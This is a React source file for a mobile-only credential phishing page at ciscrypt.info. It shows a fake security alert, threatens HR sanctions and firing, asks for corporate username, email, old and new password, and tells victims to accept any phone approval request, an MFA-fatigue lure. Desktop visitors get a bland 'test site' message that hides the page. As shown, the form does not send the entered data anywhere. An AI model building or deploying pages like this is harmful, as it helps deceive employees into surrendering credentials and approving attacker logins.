import {
  Card,
  Input,
  Checkbox,
  Button,
  Typography,
} from "@material-tailwind/react";
import {
  BrowserView,
  MobileView,
  isBrowser,
  isMobile,
} from "react-device-detect";
import { useState } from "react";

export default function App() {
  const [label, setLabel] = useState(" ");

  const params = new URLSearchParams(window.location.search);

  const user = params.get("user", "unknown");
  if (isMobile) {
    return (
      <div className="relative grid min-h-[100vh] w-screen p-8 center">
        <Card color="transparent center" shadow={false}>
          <Typography variant="h4" color="blue-gray">
            Security Alert reported for {user} at ciscrypt.info.
          </Typography>
          <Typography color="red" className="mt-2 font-normal">
            Given recent alerts our Security Expert teams believe your account
            is compromised.
          </Typography>
          <Typography color="red" className="mt-1 font-normal">
            Please use this form to change your password immediately and avoid
            being blocked from the system including HR sanctions.
          </Typography>
          <Typography color="red" className="mt-1 font-normal">
            If you receive any Phone alert/confirmation after submission you
            must ACCEPT given our Security Team is working on your behalf.
            Failing to do so may incur on HR sanctions including being fired.
          </Typography>
          <Typography color="gray" className="mt-1 font-bold">
            ** It's the employee's responsibility to keep our Company and
            Systems Secure**
          </Typography>
          <form className="mt-8 mb-2 w-80 max-w-screen-lg sm:w-96">
            <div className="mb-1 flex flex-col gap-6">
              <Typography variant="h6" color="blue-gray" className="-mb-3">
                Your Corporate user name.
              </Typography>
              <Input
                size="lg"
                placeholder="username"
                className=" !border-t-blue-gray-200 focus:!border-t-gray-900"
                labelProps={{
                  className: "before:content-none after:content-none",
                }}
              />
              <Typography variant="h6" color="blue-gray" className="-mb-3">
                Your Corporate Email
              </Typography>
              <Input
                size="lg"
                placeholder="name@ciscrypt.info."
                className=" !border-t-blue-gray-200 focus:!border-t-gray-900"
                labelProps={{
                  className: "before:content-none after:content-none",
                }}
              />
              <Typography variant="h6" color="blue-gray" className="-mb-3">
                Old Password
              </Typography>
              <Input
                type="password"
                size="lg"
                placeholder="********"
                className=" !border-t-blue-gray-200 focus:!border-t-gray-900"
                labelProps={{
                  className: "before:content-none after:content-none",
                }}
              />
              <Typography variant="h6" color="blue-gray" className="-mb-3">
                Password
              </Typography>
              <Input
                type="password"
                size="lg"
                placeholder="********"
                className=" !border-t-blue-gray-200 focus:!border-t-gray-900"
                labelProps={{
                  className: "before:content-none after:content-none",
                }}
              />
            </div>

            <Button
              className="mt-6"
              fullWidth
              onClick={(e) => {
                setLabel(
                  "Thanks for your submission, we will contact you soon - Remember to approve any request received on your phone!"
                );
              }}
            >
              Reset Password
            </Button>
            <Typography variant="h4" color="blue-gray" className="-mb-3">
              {label}
            </Typography>
          </form>
        </Card>
      </div>
    );
  } else {
    return (
      <div className="relative grid min-h-[100vh] w-screen p-8 center">
        <Card color="transparent center" shadow={false}>
          <Typography variant="h4" color="blue-gray">
            Hi! This is our test site for ciscrypt.info.
          </Typography>
        </Card>
      </div>
    );
  }
}
